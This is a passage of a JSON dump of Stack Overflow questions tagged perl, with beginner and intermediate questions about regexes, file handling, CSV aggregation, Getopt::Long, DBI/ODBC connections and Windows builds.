space):</strong></p>\n\n<pre><code>sub empty_it {\n\n    print \"\\nSTART replacing WO info !!!\\n\";\n    my $find    = \"\\&lt;sentence\\=\\\"\\\\S*\\\"\";\n    my $replace = \"\\&lt;sentence\\=\\\"\\\"\";\n    {  \n        local @ARGV = (\"$_[0]\");\n        local $^I = '.baz';\n        while ( &lt;&gt; ) {\n            if (s/$find/$replace/ig) {\n                print;\n            }\n            else {\n                print;\n            }\n        }\n    }\n}\n</code></pre>\n"},{"tags":["windows","perl","mingw","strawberry-perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12450997,"title":"Why doesn't Strawberry Perl call my DllMain?","body":"<p>I'm trying to port <a href=\"https://metacpan.org/module/Win32%3a%3aSetupsup\" rel=\"nofollow\">Win32::Setupsup</a>, a rather crusty old C++-based module intended to work with Visual C++, to Strawberry Perl and the MinGW GCC that it uses.  I've pretty much got it working except for one thing.</p>\n\n<p>The C++ part of the module has a <code>DllMain</code> function that runs some initialization code at <code>DLL_PROCESS_ATTACH</code> and cleanup code at <code>DLL_PROCESS_DETACH</code>.  When I compile the module with Visual C++, that works fine.  But when I compile it with the MinGW GCC that Strawberry Perl uses, <code>DllMain</code> is never called.</p>\n\n<p>I think the problem is just that <code>DllMain</code> is not properly identified as the DLL's entry point when compiled with <code>gcc</code>.  But I don't know how to fix that.</p>\n\n<p>The work-in-progress is in <a href=\"http://github.com/madsen/win32-setupsup\" rel=\"nofollow\">my GitHub repo for Win32::Setupsup</a>.  While I use <a href=\"http://dzil.org\" rel=\"nofollow\">Dist::Zilla</a> to manage releases, you don't actually need <code>dzil</code> to test it.  Just clone the repo, <code>perl Makefile.PL</code>, and <code>dmake test</code>.</p>\n"},{"tags":["json","perl","stream"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":142,"score":3,"question_id":12460058,"title":"How can I stream JSON from a file?","body":"<p>I will have a possibly very large JSON file and I want to stream from it instead of load it all into memory.  Based on the following statement (I added the emphasis) from <a href=\"http://search.cpan.org/dist/JSON-XS/XS.pm#INCREMENTAL_PARSING\" rel=\"nofollow\"><code>JSON::XS</code></a>, I believe it won't suit my needs.  Is there a Perl 5 JSON module that will stream the results from the disk?</p>\n\n<blockquote>\n  <p>In some cases, there is the need for incremental parsing of JSON texts. While this module <strong>always has to keep both JSON text and resulting Perl data structure in memory at one time</strong>, it does allow you to parse a JSON stream incrementally. It does so by accumulating text until it has a full JSON object, which it then can decode. This process is similar to using decode_prefix to see if a full JSON object is available, but is much more efficient (and can be implemented with a minimum of method calls).</p>\n</blockquote>\n\n<p>To clarify, the JSON will contain an array of objects.  I want to read one object at a time from the file.</p>\n"},{"tags":["perl","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":52,"score":-3,"question_id":12459325,"title":"perl module to get for each file a new one","body":"<p>Is there a perl module to write the output in a new file ?\nAfter running my code, I want to get for each file in my directory a new file where there is the output. For exemple, for my File1.csv myNewFile1.csv (whatever are the files names)\nHow can I do that for all the files I have in the directory ?\n(I hope I am clear !)</p>\n"},{"tags":["arrays","perl","2d-array"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12461348,"title":"Create schedule as a 2D array perl","body":"<p>I'm trying to initialise a 2D array in Perl that is basically a schedule. So it looks like this:</p>\n\n<pre><code>Time     Mon   Tue   Wed   Thu   Fri\n09:00     0     0     0     0     0  \n10:00     0     0     0     0     0 \n11:00     0     0     0     0     0 \n12:00     0     0     0     0     0 \n13:00     0     0     0     0     0 \n14:00     0     0     0     0     0 \n15:00     0     0     0     0     0 \n16:00     0     0     0     0     0\n17:00     0     0     0     0     0 \n18:00     0     0     0     0     0 \n19:00     0     0     0     0     0 \n20:00     0     0     0     0     0 \n</code></pre>\n\n<p>I read some articles on 2D arrays in Perl but I'm still confused. What's the easiest way to do this? And please explain a bit so I can get what's going on.</p>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12460358,"title":"How you maintain Perl packages installed with cpanm?","body":"<p>I use <a href=\"http://cpanmin.us\" rel=\"nofollow\">cpanminus</a> to install Perl packages to userspace, but i have not found idiomatic way to maintain packages afterwards. How you update, delete (with dependencies) and get overview of listed packages?</p>\n"},{"tags":["string","perl","append"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12459395,"title":"Appending a string variable to a fixed string in Perl","body":"<p>I have a variable that is entered at a prompt:</p>\n\n<pre><code>my $name = &lt;&gt;;\n</code></pre>\n\n<p>I want to append a fixed string <code>'_one'</code>to this (in a separate variable). </p>\n\n<p>E.g. if <code>$name = Smith</code> then it becomes <code>'Smith_one'</code></p>\n\n<p>I have tried several various ways which do not give me the right results, such as:</p>\n\n<pre><code>my $one = \"${name}_one\";\n</code></pre>\n\n<p>^ The <code>_one</code> appears on the next line when I print it out and when I use it, the _one is not included at all.</p>\n\n<p>Also:</p>\n\n<pre><code>my $one = $name.\"_one\";\n</code></pre>\n\n<p>^ The <code>'_one'</code> appears at the <em>beginning</em> of the string.</p>\n\n<p>And: </p>\n\n<pre><code>my $end = '_one';\nmy $one = $name.$end;\nor \nmy $one = \"$name$end\";\n</code></pre>\n\n<p>None of these produce the result I want, so I must be missing something related to how the input is formatted from the prompt, perhaps. Ideas appreciated!</p>\n"},{"tags":["perl","winapi","console"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":5276,"score":6,"question_id":1087248,"title":"How do I color output text from Perl script on Windows?","body":"<p>I would like to color format the text printed to the console using the Perl print command.</p>\n\n<p>In my case the script will only be run under WinXP-DOS Command Line but it would be great if it was OS independent although I would rather tie it to WinXP than have to download a seperate package.</p>\n"},{"tags":["perl","hash","multidimensional-array"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":40,"score":1,"question_id":12450851,"title":"Grabbing a list from a multi-dimensional hash in Perl","body":"<p>In Programming Perl (the book) I read that I can create a dictionary where the entries hold an array as follows:</p>\n\n<pre><code>$wife{\"Jacob\"} = [\"Leah\", \"Rachel\", \"Bilhah\", \"Zilpah\"];\n</code></pre>\n\n<p>Say that I want to grab the contents of <code>$wife{\"Jacob\"}</code> in a list. How can I do that?</p>\n\n<p>If I try:</p>\n\n<pre><code>$key = \"Jacob\";\nsay $wife{$key};\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>ARRAY (0x56d5df8)\n</code></pre>\n\n<p>which makes me believe that I am getting a reference, and not the actual list.</p>\n"},{"tags":["perl","xlsx","spreadsheet-excel-writer"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12384272,"title":"Why does the fillment of a bar chart in Excel::Writer::XLSX not work?","body":"<p>I create an excel sheet including a stacked bar chart.\nNow I want to have no color in the first bar, but it is still blue.\nCode looks like this:</p>\n\n<pre><code>$chart-&gt;add_series(\n    categories    =&gt; [ 'Sheet1', 1, $counter, 0, 0 ],\n    values        =&gt; [ 'Sheet1', 1, $counter, 3, 3 ],\n    name          =&gt; 'Waiting_time',\n    fill          =&gt; { none =&gt; 1 },\n    border        =&gt; { none =&gt; 1 },\n);\n</code></pre>\n\n<p>I use version 0.5 of <a href=\"https://metacpan.org/module/Excel%3a%3aWriter%3a%3aXLSX\" rel=\"nofollow\">Excel::Writer::XLSX</a></p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["eclipse","perl","epic"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":174,"score":1,"question_id":10204306,"title":"Eclipse Perl Remote Execution","body":"<p>This question is more to do with the eclipse than programming. But any programmer who has used eclipse should have some inputs for me. Here is my requirement:</p>\n\n<ul>\n<li>I have eclipse (with EPIC) installed on my Windows 7 PC. I do not\nhave any perl binary running on windows PC neither I am intending to\ninstall one.</li>\n<li>I have perl and necessary modules installed on a remote Linux box.</li>\n<li>So, my question is, <strong>Can I use the eclipse on my windows 7 PC to\nwrite/execute/debug perl programs on the remote Linux box</strong> ?</li>\n</ul>\n\n<p>I have already been through below articles:</p>\n\n<p><a href=\"http://www.epic-ide.org/guide/ch06s02.php#N10812\" rel=\"nofollow\">http://www.epic-ide.org/guide/ch06s02.php#N10812</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/8405594/run-eclipse-epic-perl-plugin-on-remote-project-files\">Run Eclipse EPIC Perl Plugin on Remote Project/Files</a></p>\n\n<p>But I am not able to interpret the information given in above links correctly. In other words, it is not working for me or my use case is different than what is described in those links.</p>\n\n<p>So, is it feasible to configure eclipse per my requirement as described above? If Yes, then could please provide me the guidance on how to achieve it.\nIf not, then is there any other workaounrd to achieve the same.\nI am pretty sure some one must have come accross similar situation.</p>\n\n<p>Thanks</p>\n"},{"tags":["linux","perl","unixodbc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":138,"score":1,"question_id":12455455,"title":"Need Help for connecting MSSQL SERVER From Linux(ubuntu)","body":"<p>I just installed the ODBC driver in the Ubuntu, but still I am facing issues while connecting the database from Perl. Here is the description on what I have done in my machine.</p>\n\n<p>I installed the MSSQL Driver and Unix ODBC from easysoft website. The path details in my machine follows:</p>\n\n<p>ODBC Installed Path:- <code>user/local/easysoft/unixodbc</code></p>\n\n<p>Data Source and Driver path: <code>user/local/etc</code> Sample Code:</p>\n\n<pre><code>#!/usr/bin/perl  \nuse strict;  \nuse DBI;   \nmy $dsn=\"DBI:ODBC:DRIVER={SQL Server};Server=xxx.xxx.xxx.xxx,1433;database=DB_name\";  \nmy $dbh = DBI-&gt;connect($dsn, \"username\", \"password\" ,{AutoCommit =&gt; 1} )\n            or die DBI::errstr;\n</code></pre>\n\n<p>Error:</p>\n\n<pre><code>DBI connect('DRIVER={SQL Server};Server=xxx.xxx.xxx.xxx,1433;database=DB_name','username',...) failed: unixODBCDriver Manager Can't open lib 'SQL Server' : file not found (SQL-01000) at sample.pl line 5 \nunixODBCDriver ManagerCan't open lib 'SQL Server' : file not found (SQL-01000) at sample.pl line 5.\n</code></pre>\n"},{"tags":["perl","csv"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":184,"score":3,"question_id":12450904,"title":"A Perl script to process a CSV file, aggregating properties spread over multiple records","body":"<p>Sorry for the vague question, I'm struggling to think how to better word it!</p>\n\n<p>I have a CSV file that looks a little like this, only a lot bigger:</p>\n\n<pre><code>550672,1\n656372,1\n766153,1\n550672,2\n656372,2\n868194,2\n766151,2\n550672,3\n868179,3\n868194,3\n550672,4\n766153,4\n</code></pre>\n\n<p>The values in the first column are a ID numbers and the second column could be described as a property (for want of a better word...).  The ID number 550672 has properties 1,2,3,4.  Can anyone point me towards how I can begin solving how to produce strings such as that for all the ID numbers?  My ideal output would be a new csv file which looks something like:</p>\n\n<pre><code>550672,1;2;3;4\n656372,1;2\n766153,1;4\n</code></pre>\n\n<p>etc.</p>\n\n<p>I am very much a Perl baby (only 3 days old!) so would really appreciate direction rather than an outright solution, I'm determined to learn this stuff even if it takes me the rest of my days! I have tried to investigate it myself as best as I can, although I think I've been encumbered by not really knowing what to really search for.  I am able to read in and parse CSV files (I even got so far as removing duplicate values!) but that is really where it drops off for me. Any help would be greatly appreciated! </p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":12453419,"title":"Perl: How to extract the range of lines starting from \"IF\" to \"END-IF\" ignoring the lines starting with a *","body":"<p>My code tries to extract the range even if the line starts with a * Here is my code:</p>\n\n<pre><code>while (&lt;FILE1&gt;) {\n\n    $_ =~ s/^\\s+//; #remove leading spaces\n    $_ =~ s/\\s+$//; #remove trailing spaces\n\n    if (/IF/ .. /END-IF/) {\n\n        if($_ =~ m/END-IF/) {\n\n            $flag = 1;\n        }\n        print FINAL \"$_\\n\";\n\n        if ($flag == 1) {\n\n            $flag = 0;\n            print FINAL \"\\n\\n\";\n        }\n    }\n}\nclose FINAL;\nclose FILE1;\n</code></pre>\n\n<p>My FINAL output file should contain only the the ranges between all IF's and END-IF's seperated by \\n\\n  AND if there is an IF within an IF block, The range starting from the first if to the line before the second IF should be saved in FINAL seperated by \\n\\n</p>\n"},{"tags":["regex","perl","delete-row"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":12452668,"title":"perl to delete consecutive duplicate lines","body":"<p>I want to delete the consecutive duplicate lines. i.e. for example</p>\n\n<pre><code>**test.txt**\ncar\nspeed is good\nbike \nslower than car\nplane\nsuper fast\nsuper fast\nbullet train \nsuper fast\n</code></pre>\n\n<p>This removes all the duplicate lines except the 1st occurance.</p>\n\n<pre><code>perl -ne 'print unless $a{$_}++'\n</code></pre>\n\n<p>But i want the ouput to be</p>\n\n<pre><code>    **test.txt**\n    car\n    speed is good\n    bike \n    slower than car\n    plane\n    super fast\n    bullet train \n    super fast\n</code></pre>\n\n<p>I tried this oneliner but this doesnt do anything but just prints the input.</p>\n\n<pre><code>perl -00 -F'&lt;\\w+&gt;|&lt;/\\w+&gt;' -i.bak -lane 'foreach(@F){if ($_=~/\\w+/ &amp;&amp; ($a ne $_)){print \"$_\";$a=$_;}}'\n</code></pre>\n\n<p>How to do this???</p>\n"},{"tags":["regex","arrays","string","perl","split"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12452087,"title":"Perl regex String part to array","body":"<p>I have a string:</p>\n\n<pre><code>\"2012-szept-17 02:55 - someproblem: 192.167.1.1 since - $somevariables[0] $morevariables[-1]\"\n</code></pre>\n\n<p>and I want to get these out of it into an array</p>\n\n<pre><code>$somevariables[0]\n$morevariables[-1]\n</code></pre>\n\n<p>The problem is that these variables can be named anything else and they could be anywhere in the string. The only thing I know about them is that they start with <code>$</code> and have <code>[sg]</code> in the end.</p>\n\n<p>This is the furthest I got with the regexp </p>\n\n<pre><code>my @fuu = $notimsg =~ m/(\\$.+\\[.+\\])/g;\n</code></pre>\n\n<p>The problem is that the expression is making this into <code>\"$somevariables[0] $morevariables[-1]\"</code></p>\n"},{"tags":["perl","command-line-arguments"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":96,"score":2,"question_id":12451929,"title":"passing command line arguments in perl","body":"<p>I have trouble in assigning an argument value / command line arguments. Here is what i actually want to do.</p>\n\n<pre><code>Test.pl\n#!/usr/bin/perl\n\n#Variable declaration\n\n$RUN_DIR=\"/home/ckhau/database/experiment/test\";\n    #Main program\n\n$index=-999; \n#my $ARGV;\n@files = &lt;$RUN_DIR/b*.txt&gt;;\n\nforeach $file (@files)\n{\n #$SCRIPT=\"perl abcdinfo.pl $file\";\n $SCRIPT=\"perl abc.pl $file\";\n system(\"$SCRIPT\");       \n}\n</code></pre>\n\n<p>I tried replacing b*.txt with @ARGV and tried running the program i.e when i replace the above code with </p>\n\n<pre><code>@files = &lt;$RUN_DIR/@ARGV&gt;;\n</code></pre>\n\n<p>Then try to run with command line</p>\n\n<pre><code>perl Test.pl b*.txt\n</code></pre>\n\n<p>This gives me an error perl: no match. Can anyone help me on the following.</p>\n\n<p>How to use command line argument for this ???</p>\n\n<p>Can i use these kind of syntax in command lines \"b*.txt\" or \"r_*.txt\"???</p>\n"},{"tags":["php","regex","perl","string-matching"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12421199,"title":"Regex: Previous statement must have mached at least 1 character","body":"<p>I have a case-insensitive regex:</p>\n\n<p><code>f?a?(x|csim)?(mob)?(ile\\s*?)?(tel)?(e)?(phone|p|t|m)?\\s*?:?\\s*?(\\s*?\\(*?\\d\\)*?){8,10}</code></p>\n\n<p>And here are my test cases:</p>\n\n<p>I want these to match:</p>\n\n<ul>\n<li>Tel: 9555 5454 </li>\n<li>telephone 08 9555 5454 </li>\n<li>mobile 0411111 111 </li>\n<li>Mob 0411 111 111</li>\n<li>Mobile : (0411) 111 111</li>\n<li>Telephone: (08) 9555 5454</li>\n<li>M0411111111</li>\n<li>phone : (08) 9555 5454</li>\n<li>p : (08)95 55 54 54</li>\n<li>T:0895555454</li>\n<li>Facsimile: (08) 9555 5353</li>\n<li>Fax 95555353</li>\n<li>F 95 55 53 53</li>\n</ul>\n\n<p>But I don't want these to match</p>\n\n<ul>\n<li>0411 111 111</li>\n<li>(08) 9555 5454</li>\n<li>0411111111</li>\n</ul>\n\n<p>Basically, I want to match things I identify as being a phone number, but <strong>only</strong> if they are prepended by an identifier to that effect.</p>\n\n<p>My regex will successfully match the prefixed identifier, but because the whole thing is non-greedy, the \"non-matching\" test cases fail, because my regex specifies \"match the prefix if it is there, but don't require it\".</p>\n\n<p>Any ideas?</p>\n\n<ul>\n<li>Please note: I am using the Perl/PHP version of regex.</li>\n</ul>\n"},{"tags":["perl","encryption","byte"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":93,"score":2,"question_id":12450750,"title":"How can I work with raw bytes in perl","body":"<p>Documentation all directs me to unicode support, yet I don't think my request has anything to do with Unicode.  I want to work with raw bytes within the context of a single scalar; I need to be able to figure out its length (in bytes), take substrings of it (in bytes), write the bytes to disc, and over the network.  Is there an easy way to do this, without treating the bytes as any sort of encoding in perl?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>More explicitly,</p>\n\n<pre><code>my $data = \"Perl String, unsure of encoding and don't need to know\";\nmy @data_chunked_into_1024_bytes_each = #???\n</code></pre>\n"},{"tags":["perl","file","storage"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":435,"score":3,"question_id":2484153,"title":"How can I build something like Amazon S3 in Perl?","body":"<p>I am looking to code a file storage application in perl similar to amazon s3. I already have a amazon s3 clone that I found online called parkplace but its in ruby and is old also isn't built for high loads. I am not really sure what modules and programs I should use so id like some help picking them out. My requirements are listed below (yes I know there are lots but I could start simple then add more once I get it going):</p>\n\n<ul>\n<li>Easy API implementation for client side apps. (maybe REST (?)</li>\n<li>Centralized database server for the USERDB (maybe PostgreSQL (?).</li>\n<li>Logging of all connections, bandwidth used, well pretty much everything to a centralized server (maybe PostgreSQL again (?).</li>\n<li>Easy server side configuration (config file(s) stored on the servers).</li>\n<li>Web based control panel for admin(s) and user(s) to show logs. (could work just running queries from the databases)</li>\n<li>Fast</li>\n<li>High Uptime</li>\n<li>Low memory usage</li>\n<li>Some sort of load distribution/load balancer (maybe a dns based or pound or perlbal or something else (?).</li>\n<li>Maybe a cache of some sort (memcached or parlbal or something else (?).</li>\n</ul>\n\n<p>Thanks in advance</p>\n"},{"tags":["python","perl","operators"],"answer_count":4,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":2864,"score":4,"question_id":4480316,"title":"Python equivalent of Perl file test readable (-r), writeable (-w) and executable (-x) operators","body":"<p>I have been Googling to try and find an equivalent in Python to some of Perl's file test operators. </p>\n\n<p>Most of the file test operators are just a direct Pythonification of the underlying os' <code>stat</code> call. For example, <code>os.stat('file').st_ctime</code> just reads the inode change time as the *nix <code>stat</code> utility or <code>ls -l</code> would do.</p>\n\n<p>Some of the Perl file test operators I cannot find an equivalent in Python. For example, I have a data tree of 85,000 image files created by a variety of applications. Some of the files have the <a href=\"http://unixpapa.com/incnote/setuid.html\" rel=\"nofollow\">effective UID</a> set in a way that is nettlesome and a modification fails for a permission issue. So for those files I need to run something like:</p>\n\n<pre><code>$ find . -type f -print0 | perl -0 -lnE 'say unless -w' | change euid...\n</code></pre>\n\n<p>Since I have not found the equivalent in Python, I have to shell out to Perl to find these files. I found <a href=\"http://blog.endpoint.com/2009/08/file-test-comparison-table-for-shell.html\" rel=\"nofollow\">this table</a> which suggests there is no direct equivalent. True?</p>\n"},{"tags":["php","perl","apache"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12443479,"title":"Is there any way to communicate from Perl to PHP using internal redirect and apache_notes?","body":"<p>My main app is written using PHP, but I'm using a Perl script to process a request, and I want to pass information to the PHP app using apache_notes. I would prefer not to use query parameters.</p>\n\n<p>Here's the documentation on apache notes I found</p>\n\n<ul>\n<li><a href=\"http://us3.php.net/manual/en/function.apache-note.php\" rel=\"nofollow\">for PHP</a></li>\n<li><a href=\"http://perl.apache.org/docs/2.0/api/Apache2/RequestRec.html#C_notes_\" rel=\"nofollow\">for Perl</a></li>\n</ul>\n\n<p>On the PHP documentation, there is an example of how to use apache notes from PHP->Perl. Does anyone have an example of how to go from Perl->PHP, or suggest another way to securely communicate from Perl to PHP without having to go through query parameters?</p>\n"},{"tags":["regex","string","perl"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":137,"score":1,"question_id":12445551,"title":"Perl: How to replace only matched part of string?","body":"<p>I have a string <code>foo_bar_not_needed_string_part_123</code>. Now in this string I want to remove <code>not_needed_string_part</code> only when <code>foo_</code> is followed by <code>bar</code>. </p>\n\n<p>I used the below regex:</p>\n\n<pre><code>my $str = \"foo_bar_not_needed_string_part_123\";\n\nsay $str if $str =~ s/foo_(?=bar)bar_(.*?)_\\d+//;\n</code></pre>\n\n<p>But it removed the whole string and just prints a newline.</p>\n\n<p>So, what I need is to remove only the matched (.*?) part. So, that the output is </p>\n\n<pre><code>foo_bar__123.\n</code></pre>\n"},{"tags":["linux","perl","shell","unix","nawk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12450025,"title":"Want to edit a file in place (substitute a column value) based on a value in another column in the same file","body":"<p>I want to edit a file in place (substitute a column value) based on a value in another column in same file. I don't want to redirect the output after substitution to another file but rather would want to edit the file in place. Specifically need this because file which needs to be edited will be accessed by no of programs simultaneously and in-place editing is must for this</p>\n\n<p>I tried code below. but this is again writing to input file line by line</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nopen(FILEIN, \"/dummy/chaat/h2\") || die(\"Cannot open file\");\n@file = &lt;FILEIN&gt;;\nseek FILEIN, 0, 0;\n\nforeach $file (@file) {\n    @field = split(/\\|/, $file);\n    print $field[8] . \"\\n\";\n    if ($field[8] eq \"ROBERT\") {\n        $file =~ s/JAMES/FUDIK/g;\n        print FILEIN $file;\n    }\n}\n</code></pre>\n\n<p>My sample records are as shown below. Here I want to do inline editing of this. if field 8 is ROBERT then substitute JAMES with FUDIK in field 7</p>\n\n<pre><code>Change|sinmg|ewfewf|ewfew|def|fdfd|JAMES|rewr|ROBERT|dsf|fe\nChange|sinmg|ewfewf|ewfew|def|JAMES|fewf|rewr|BEASLEY|dsf|fe\n</code></pre>\n\n<p>I would appreciate any help on this</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":75,"score":0,"question_id":12443798,"title":"perl regular expression","body":"<p>my data looks like </p>\n\n<pre><code>NC_004415 NC_010199 ([T(trnH ,trnS1 trnL1 ,)])\nNC_006131 NC_010199 ([T(trnH ,trnS1 trnL1 ,)])\nNC_006355 NC_007231 ([T(trnM ,trnQ ,)])\n</code></pre>\n\n<p>I want to capture everything between [];</p>\n\n<pre><code>while( my $line = &lt;crex&gt; )\n\n {  $t=$line=~m/(\\[.*\\])/;\n\n    print $t;\n}   \n    }\n</code></pre>\n\n<p>the output of $t is 1 ! why does it not working</p>\n"},{"tags":["regex","perl","foreach","hashtable"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12449914,"title":"perl hash array reading from files","body":"<p>I'm trying to read multiple files that have the same format and want to make some statistics based on regex. </p>\n\n<p>i.e I want to count similar items that are within the []</p>\n\n<pre><code> NC_013618 NC_013633 ([T(nad6 trnE ,cob trnT ,)])\nC_013481 NC_013479 ([T(trnP ,rrnS trnF trnV rrnL nad1 trnI ,)])\nNC_013485 NC_003159 ([T(trnC ,trnY ,)])\nNC_013554 NC_013254 ([T(trnR ,trnN ,)])\nNC_013607 NC_013618 ([T(nad6 trnE ,cob trnT ,)])\n</code></pre>\n\n<p>the problem is that i'm not getting right values, below is my code:</p>\n\n<pre><code> use strict;\n use warnings;\n\nmy %data;\n@FILES = glob(\"../mitos-crex/*.out\");\nforeach my $file (@FILES) {\n    local $/ = undef;\n    open my $fh, '&lt;', $file;\n    $data{$file} = &lt;$fh&gt;;\n}\n\nmy @t;\nmy $c = 0;\nforeach my $line (keys %data) {\n    foreach my $l ($data{$line}) {\n         print $l.\"\\n\";\n        ($t[$c]) = $l =~ m/(\\[.*\\])/;\n\n        $c++;\n    }\n}\n\n#the problem is here the counter is not giving the right value\n\nprint $c;\nmy %counts;\n$counts{$_}++ for @t;\n</code></pre>\n\n<p>thanks in advance</p>\n"},{"tags":["java","c++","perl","programming-languages"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":50,"score":-1,"question_id":12449749,"title":"Choice of language for feed processing (xml, plain text)","body":"<p>So this is my scenario,\nI've a large amount of feeds coming in, in the form of XML / plain text. The total amount of feed that I get per day is few GigaBytes. The processing of the feeds will be done once or twice per day.</p>\n\n<p>Now I want to decide on which language will be good for designing a system that processes this feed (that is, parse it, extract the proper information and put it in the required databases). The initial choice was perl, because it's well known for text processing. However, I was thinking from the point of writing good code and how the language enforces some good coding standards. I want proper unit testing, documentation, logging and monitoring in the code. So then I thought about Java as it has so many libraries to help me do that. Also, going forward I want to consider how easy it'll be to maintain the code base and upgrade and the support the particular language will have in the future. Here again I thought Java will be a better choice.\nOf course there's C++ and many more languages that I may not know of. I'm open to learning new languages. So I need advice on which language to start with.</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","built-in"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":12449823,"title":"Perl built-ins to find list of indices pointing to unique entries in a list","body":"<p>Say I have a list of strings with possible repetitions. I am trying to find the list of sorted indices of this list that hold the unique entries in the list of strings.</p>\n\n<p>E.g. Given:</p>\n\n<pre><code>my @string_list = (\"hello\", \"world\", \"hello\", \"how\", \"are\", \"world\");\n</code></pre>\n\n<p>The output with the list of indices would be: <code>[0, 1, 3, 4]</code> which correspond to the words <code>\"hello\"</code>, <code>\"world\"</code>, <code>\"how\"</code> and <code>\"are\"</code>.</p>\n\n<p>To do this, I can loop through the input list and keep track of the elements I have seen in a list in a dictionary that hold these indices, and use these indices later to obtain a list of unique items.</p>\n\n<p>However, I was wondering if there are any other built-ins, functions or data-structures in Perl that facilitate this task and maybe avoid writing this in a loop.</p>\n"}]}
{"total":22324,"page":18,"pagesize":100,"questions":[{"tags":["perl","zend-framework"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12448910,"title":"How do I enable cgi-bin directory for Zend","body":"<p>I have some legacy perl scripts (yes, they are HTML done in perl) that I want to iframe into my Zend application. My preference is to have a /cgi-bin directory under /application that holds the perl scripts. How do I configure Zend to allow access to that directory? It needs to be off doc-root for security, but I want to access it from javascript. If javascript is the wrong way, how can I use a .pl file like a php module to be loaded into an iframe or div?</p>\n\n<p>Any suggestions are appreciated.</p>\n"},{"tags":["regex","string","perl","match"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12446128,"title":"exact string in perl subtitute","body":"<p>I'm trying to use the following in perl but it doesn't seem to be working. How do I match the exact sring without any interpolation of any string characters? I tried quotes and \\Q, \\E but nothing works</p>\n\n<pre><code>$string=~ s/\\`date +%s\\`/anotherthinghere/;\n</code></pre>\n\n<p>for clarity, string I'm trying to match is</p>\n\n<pre><code>`date +%s`\n</code></pre>\n\n<p>Oh, forgot to mention that <code>date +%s</code> is in a variable.</p>\n"},{"tags":["perl","getopt"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":2,"view_count":836,"score":2,"question_id":217595,"title":"How to get options in the order entered by the user, using Perl's Getopt::Long?","body":"<p>I have an existing Perl program that uses <code>Getopt</code> package and <code>Getopt::Long::Configure</code> with <code>permute</code> as one of the options. However, now I need to keep the order of the options entered by the user. There is an option <code>$RETURN_IN_ORDER</code> mentioned in the <code>Long.pm</code>, however doesn't seem to be used anywhere at all. </p>\n\n<p>When I pass <code>return_in_order</code>, I am getting the following error.</p>\n\n<p><hr /></p>\n\n<blockquote>\n  <p>Getopt::Long: unknown config parameter \"return_in_order\" at C:/Program Files/IBM/RationalSDLC/common/lib/perl5/5.8.6/Getopt/Long.pm line 1199.</p>\n</blockquote>\n\n<p><hr /></p>\n\n<p>Can someone please tell me if this is supported at all and if so, the right way to use? If not, I would like to know the other alternatives I have.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","script","hashmap"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12441618,"title":"Get the output of git show-ref --tags in a hash using Perl","body":"<p>I get the output of \n<code>git show-ref --tags</code>, which looks like:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>1231243424324234234324242421412414121212 Tagname\n1231341253432148224235423652423654782363 tagnametwo\n2453491533961372624623247862387746223647 tagnamethree\n</code></pre>\n\n<p>I want to take these values in a hash, such that the commit id is the key and the tag name is its value.</p>\n"},{"tags":["perl","cross-platform"],"answer_count":7,"favorite_count":7,"up_vote_count":23,"down_vote_count":0,"view_count":17693,"score":23,"question_id":334686,"title":"How can I detect the operating system in Perl?","body":"<p>I have Perl on Mac, Windows and Ubuntu. How can I tell from within the script which one is which? Thanks in 